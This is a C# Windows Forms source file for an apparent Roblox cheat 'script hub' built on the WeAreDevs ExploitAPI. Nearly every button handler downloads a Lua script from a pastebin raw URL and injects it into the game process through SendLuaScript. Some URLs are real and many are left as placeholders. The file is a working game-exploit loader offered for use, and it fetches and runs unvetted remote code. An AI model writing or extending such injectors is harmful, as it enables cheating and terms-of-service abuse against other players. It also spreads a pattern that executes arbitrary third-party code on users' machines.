using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Net;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using WeAreDevs_API;

namespace KEY_SYSTEM
{
    public partial class ScriptHub : Form
    {
        ExploitAPI module = new ExploitAPI();
        public ScriptHub()
        {
            InitializeComponent();
        }

        Point lastPoint;

        private void button1_Click(object sender, EventArgs e)
        {
            WebClient wb = new WebClient();
            string Script = wb.DownloadString("https://pastebin.com/raw/cPxGx27V");
            module.SendLuaScript(Script);
        }

        private void button2_Click(object sender, EventArgs e)
        {
            WebClient wb = new WebClient();
            string Script = wb.DownloadString("https://pastebin.com/raw/7c3itRLS");
            module.SendLuaScript(Script);
        }

        private void panel1_MouseDown(object sender, MouseEventArgs e)
        {
            lastPoint = new Point(e.X, e.Y);

        }

        private void panel1_MouseMove(object sender, MouseEventArgs e)
        {
            if (e.Button == MouseButtons.Left)
            {
                this.Left += e.X - lastPoint.X;
                this.Top += e.Y - lastPoint.Y;
            }

        }

        private void button3_Click(object sender, EventArgs e)
        {

            WindowState = FormWindowState.Minimized;
        }

        private void button4_Click(object sender, EventArgs e)
        {
            Application.Exit();
        }

        private void button5_Click(object sender, EventArgs e)
        {

            WebClient wb = new WebClient();
            string Script = wb.DownloadString("RAW PASTEBIN LINK HERE");
            module.SendLuaScript(Script);
        }

        private void button8_Click(object sender, EventArgs e)
        {
            WebClient wb = new WebClient();
            string Script = wb.DownloadString("RAW PASTEBIN LINK HERE");
            module.SendLuaScript(Script);
        }

        private void button7_Click(object sender, EventArgs e)
        {
            WebClient wb = new WebClient();
            string Script = wb.DownloadString("RAW PASTEBIN LINK HERE");
            module.SendLuaScript(Script);
        }

        private void button10_Click(object sender, EventArgs e)
        {
            WebClient wb = new WebClient();
            string Script = wb.DownloadString("RAW PASTEBIN LINK HERE");
            module.SendLuaScript(Script);
        }

        private void button12_Click(object sender, EventArgs e)
        {
            WebClient wb = new WebClient();
            string Script = wb.DownloadString("RAW PASTEBIN LINK HERE");
            module.SendLuaScript(Script);

        }

        private void button6_Click(object sender, EventArgs e)
        {
            WebClient wb = new WebClient();
            string Script = wb.DownloadString("RAW PASTEBIN LINK HERE");
            module.SendLuaScript(Script);
        }

        private void button9_Click(object sender, EventArgs e)
        {
            WebClient wb = new WebClient();
            string Script = wb.DownloadString("RAW PASTEBIN LINK HERE");
            module.SendLuaScript(Script);
        }

        private void button11_Click(object sender, EventArgs e)
        {
            WebClient wb = new WebClient();
            string Script = wb.DownloadString("RAW PASTEBIN LINK HERE");
            module.SendLuaScript(Script);
        }

        private void button17_Click(object sender, EventArgs e)
        {
            WebClient wb = new WebClient();
            string Script = wb.DownloadString("RAW PASTEBIN LINK HERE");
            module.SendLuaScript(Script);
        }

        private void button16_Click(object sender, EventArgs e)
        {
            WebClient wb = new WebClient();
            string Script = wb.DownloadString("RAW PASTEBIN LINK HERE");
            module.SendLuaScript(Script);
        }

        private void button15_Click(object sender, EventArgs e)
        {
            WebClient wb = new WebClient();
            string Script = wb.DownloadString("RAW PASTEBIN LINK HERE");
            module.SendLuaScript(Script);
        }

        private void button14_Click(object sender, EventArgs e)
        {
            WebClient wb = new WebClient();
            string Script = wb.DownloadString("RAW PASTEBIN LINK HERE");
            module.SendLuaScript(Script);
        }

        private void button13_Click(object sender, EventArgs e)
        {
            WebClient wb = new WebClient();
            string Script = wb.DownloadString("RAW PASTEBIN LINK HERE");
            module.SendLuaScript(Script);
        }

        private void button18_Click(object sender, EventArgs e)
        {
            WebClient wb = new WebClient();
            string Script = wb.DownloadString("https://pastebin.com/raw/6rY7DKPA");
            module.SendLuaScript(Script);
        }

        private void button19_Click(object sender, EventArgs e)
        {
            WebClient wb = new WebClient();
            string Script = wb.DownloadString("https://pastebin.com/raw/L2DirZRx");
            module.SendLuaScript(Script);
        }

        private void button20_Click(object sender, EventArgs e)
        {
            WebClient wb = new WebClient();
            string Script = wb.DownloadString("https://pastebin.com/raw/sTzYDfMg");
            module.SendLuaScript(Script);
        }

        private void button21_Click(object sender, EventArgs e)
        {
            WebClient wb = new WebClient();
            string Script = wb.DownloadString("https://pastebin.com/raw/ivNqWQn7");
            module.SendLuaScript(Script);
        }

        private void button22_Click(object sender, EventArgs e)
        {
            WebClient wb = new WebClient();
            string Script = wb.DownloadString("RAW PASTEBIN LINK HERE");
            module.SendLuaScript(Script);
        }
    }
}

